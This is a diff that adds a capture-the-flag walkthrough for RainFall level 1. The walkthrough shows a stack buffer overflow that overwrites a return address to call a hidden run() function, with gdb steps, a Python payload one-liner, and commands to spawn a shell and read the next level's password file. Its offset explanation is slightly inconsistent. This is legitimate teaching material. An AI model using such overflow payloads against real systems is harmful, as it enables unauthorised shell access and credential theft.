@@ -1,0 +1,108 @@
+## 📄 RainFall Level 1 Exploit Walkthrough
+
+
+### 📌 Objective:
+
+Exploit a **buffer overflow** in `level1` to call a hidden function named `run()` which spawns `/bin/sh`, allowing you to read the flag in the next user’s home directory.
+
+---
+
+### 📌 How to Find the Overflow Offset
+
+1. **Disassemble the program**
+
+   ```bash
+   gdb ./level1
+   disas main
+   ```
+2. **Locate the buffer allocation in `main`**
+   Look for something like:
+
+   ```
+   sub esp, 0x4c
+   ```
+
+   `0x4c` in hex is **76 bytes**.
+
+**Meaning:**
+
+* 76 bytes for the buffer
+* +4 bytes for saved EBP
+* Next is the **saved return address**
+
+**Our overflow target is at byte 76.**
+
+---
+
+### 📌 Find `run()` Function Address
+
+Use:
+
+ghidra to find a RUN() function and it address 
+
+Example output:
+
+```
+08048444 <run>:
+```
+
+**Meaning:**
+Address of `run()` is `0x08048444`
+
+---
+
+### 📌 Build the Exploit Payload
+
+**Payload Structure:**
+
+```
+76 bytes of padding ('A')
++ 4 bytes: address of run() (little-endian)
+```
+
+**Little-endian conversion of 0x08048444:**
+
+```
+\x44\x84\x04\x08
+```
+
+---
+
+**With Python:**
+
+```bash
+python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/payload
+cat /tmp/payload - | ./level1
+```
+
+This also leaves stdin open for interaction.
+
+---
+
+### 📌 Test the Exploit
+
+After running the exploit:
+
+* Type `whoami` to confirm shell
+* Type `cat /home/level2/.pass` to read the flag
+
+---
+
+### 📌 Clean up / Exit
+
+* Type `exit` to leave the shell
+* Program will segfault — normal due to stack corruption
+
+---
+
+## 📌 Summary
+
+* Disassemble to find buffer size (76 bytes)
+* Find `run()` address
+* Build payload: **76 'A's + address**
+* Send payload, keeping stdin open
+* Spawn shell and capture flag
+
+---
+
+✅ **Done — level1 cleared.**
